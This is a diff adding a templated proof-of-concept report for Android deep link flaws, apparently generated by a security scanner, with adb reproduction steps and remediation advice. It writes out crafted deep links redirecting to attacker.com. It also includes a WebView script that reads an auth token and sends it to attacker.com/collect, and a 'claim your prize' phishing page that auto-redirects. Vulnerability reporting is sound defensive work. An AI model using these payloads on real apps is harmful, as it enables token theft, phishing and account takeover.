@@ -1,0 +1,102 @@
+# PoC: Deep Link Vulnerability — {{ finding.title }}
+
+## Classification
+| Field | Value |
+|---|---|
+| **CWE** | {{ cwe }} |
+| **Severity** | {{ severity }} |
+| **CVSS** | {{ cvss }} |
+| **Component** | {{ class_name }} |
+
+## Description
+{{ description }}
+
+## Prerequisites
+- Android device or emulator with ADB access
+- Target app (`{{ package_name }}`) installed
+- `adb` command-line tool
+- Browser on the device
+
+## Steps to Reproduce
+
+### 1. Extract Deep Link Schemes
+```bash
+# List intent filters for the app
+adb shell dumpsys package {{ package_name }} | grep -B 5 -A 10 "scheme"
+adb shell dumpsys package {{ package_name }} | grep -A 15 "android.intent.action.VIEW"
+```
+
+### 2. Craft Malicious Deep Link
+```bash
+# Test basic deep link handling
+adb shell am start -a android.intent.action.VIEW -d "{{ package_name }}://callback"
+
+# Test with redirect parameter
+adb shell am start -a android.intent.action.VIEW -d "{{ package_name }}://callback?redirect=https://attacker.com"
+adb shell am start -a android.intent.action.VIEW -d "{{ package_name }}://callback?url=https://evil.com"
+adb shell am start -a android.intent.action.VIEW -d "{{ package_name }}://callback?next=https://attacker.com"
+```
+
+{% if "CWE-601" in cwe %}
+### 3. Test Open Redirect
+```bash
+# URL encoding variations
+adb shell am start -a android.intent.action.VIEW \
+  -d "{{ package_name }}://auth?redirect_uri=https%3A%2F%2Fattacker.com"
+
+# Double encoding
+adb shell am start -a android.intent.action.VIEW \
+  -d "{{ package_name }}://auth?redirect_uri=https%253A%252F%252Fattacker.com"
+
+# Token theft via redirect
+adb shell am start -a android.intent.action.VIEW \
+  -d "{{ package_name }}://oauth/callback?code=STOLEN&redirect=https://attacker.com/collect"
+```
+{% endif %}
+
+{% if "CWE-749" in cwe %}
+### 3. Test WebView JavaScript Interface Exploitation
+```bash
+# If deep link loads URL in WebView with JS interface
+adb shell am start -a android.intent.action.VIEW \
+  -d "{{ package_name }}://webview?url=https://attacker.com/exploit.html"
+
+# Create exploit.html on attacker server:
+# <script>
+#   // Call exposed JavaScript interface
+#   var token = AndroidBridge.getAuthToken();
+#   fetch("https://attacker.com/collect?token=" + token);
+# </script>
+```
+{% endif %}
+
+### 4. Create Attacker HTML Page
+```html
+<!-- Save as exploit.html, host on a web server or local HTTP server -->
+<!DOCTYPE html>
+<html>
+<body>
+  <h1>Click to claim your prize!</h1>
+  <a href="{{ package_name }}://callback?redirect=https://attacker.com/steal">
+    Claim Now
+  </a>
+  <script>
+    // Auto-redirect after 1 second
+    setTimeout(function() {
+      window.location = "{{ package_name }}://callback?redirect=https://attacker.com/steal";
+    }, 1000);
+  </script>
+</body>
+</html>
+```
+
+## Expected Result
+- The app processes the deep link without validating the origin or destination
+- Tokens, session data, or auth codes are leaked to the attacker-controlled URL
+- The user is redirected to a phishing page
+
+## Impact
+An attacker can craft a malicious link that, when opened by the victim, steals authentication tokens, session cookies, or redirects the user to a phishing page. This can lead to full account takeover.
+
+## Remediation
+{{ remediation or "1. Validate all deep link parameters against an allowlist of trusted domains\n2. Never pass authentication tokens via URL parameters in deep links\n3. Implement origin verification for OAuth callbacks\n4. Use App Links (HTTPS) instead of custom schemes for sensitive flows\n5. Add `android:autoVerify=\"true\"` to intent filters" }}
